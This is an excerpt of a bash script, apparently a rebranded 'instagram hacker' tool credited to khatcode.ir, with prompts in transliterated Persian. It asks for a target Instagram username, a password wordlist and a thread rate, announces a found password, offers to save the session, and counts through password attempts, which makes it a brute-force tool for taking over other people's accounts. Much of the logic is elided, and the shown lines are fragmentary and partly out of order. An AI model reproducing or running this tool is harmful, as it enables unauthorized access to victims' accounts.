...
banner() {
figlet khatcode edited | lolcat
echo "instagram hacker edited by khatcode.ir"| lolcat 
}
...
#checkroot
dependencies
read -p $'\e[1;92m یوزر اینستا --insta user: \e[0m' user
...
read -p $'\e[1;92m pasword list khodetoon ro vared konid (agar nadarid enter bezanid): \e[0m' wl_pass
wl_pass="${wl_pass:-${default_wl_pass}}"
default_threads="10"
read -p $'\e[1;92mtedad check dar sanee (bein 10 ta 20): \e[0m' threads
...
if [[ -n "$threads" ]]; then
printf "\e[1;91m RAMZ RO PEYDA KARDAM \n\e[0m"
...
default_session="Y"
printf "\n\e[1;77m mikhay ta inja ro zakhire konam ? \e[0m\e[1;92m %s \e[0m"|lolcat # $user 
...
let token++
printf "\e[1;77memtehan kardan pasworde (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #token
...
printf "\e[1;91m[*] Ctrl + C ro bezan ta motevaghef she\n\e[0m"
